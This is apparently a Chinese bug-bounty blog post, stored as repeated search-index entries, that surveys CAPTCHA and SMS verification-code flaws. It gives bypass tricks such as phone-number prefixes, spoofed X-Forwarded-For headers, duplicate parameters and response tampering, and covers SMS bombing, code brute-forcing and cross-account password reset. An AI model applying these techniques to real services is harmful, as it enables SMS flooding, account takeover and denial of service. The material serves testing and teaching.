图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码长宽可控"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码可绕过"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码不失效"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码可识别"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码随机值可控"},{"categories":["学习"],"content":" 图形验证码 图形验证码长宽可控简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。 当length为比较大的时候，响应时间为2767millis 注意：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临法律责任。 图形验证码可绕过有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。 图形验证码不失效简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功! 图形验证码可识别这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释 图形验证码随机值可控都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面 将characters固定为aaaa，可以看到图形验证码为aaaa 图形验证码返回到前端测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:1","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#图形验证码返回到前端"},{"categories":["学习"],"content":" 短信验证码我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码多很多 短信炸弹纵向在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为短信炸弹or短信轰炸or短信炸弹纵向 不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信 短信炸弹横向上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。 将phone设置成变量，进行遍历 短信验证码可爆破我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。 短信验证码可编辑我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。 通过修改transAmt 参数内容，可随意修改短信内容 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:2","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信验证码"},{"categories":["学习"],"content":" 短信验证码我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码多很多 短信炸弹纵向在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为短信炸弹or短信轰炸or短信炸弹纵向 不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信 短信炸弹横向上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。 将phone设置成变量，进行遍历 短信验证码可爆破我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。 短信验证码可编辑我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。 通过修改transAmt 参数内容，可随意修改短信内容 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:2","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹纵向"},{"categories":["学习"],"content":" 短信验证码我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码多很多 短信炸弹纵向在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为短信炸弹or短信轰炸or短信炸弹纵向 不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信 短信炸弹横向上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。 将phone设置成变量，进行遍历 短信验证码可爆破我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。 短信验证码可编辑我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。 通过修改transAmt 参数内容，可随意修改短信内容 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:2","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹横向"},{"categories":["学习"],"content":" 短信验证码我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码多很多 短信炸弹纵向在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为短信炸弹or短信轰炸or短信炸弹纵向 不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信 短信炸弹横向上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。 将phone设置成变量，进行遍历 短信验证码可爆破我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。 短信验证码可编辑我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。 通过修改transAmt 参数内容，可随意修改短信内容 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:2","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信验证码可爆破"},{"categories":["学习"],"content":" 短信验证码我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码多很多 短信炸弹纵向在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为短信炸弹or短信轰炸or短信炸弹纵向 不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信 短信炸弹横向上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。 将phone设置成变量，进行遍历 短信验证码可爆破我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。 短信验证码可编辑我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。 通过修改transAmt 参数内容，可随意修改短信内容 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:2","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信验证码可编辑"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧-1--特殊字符"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧-2--添加-xff"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 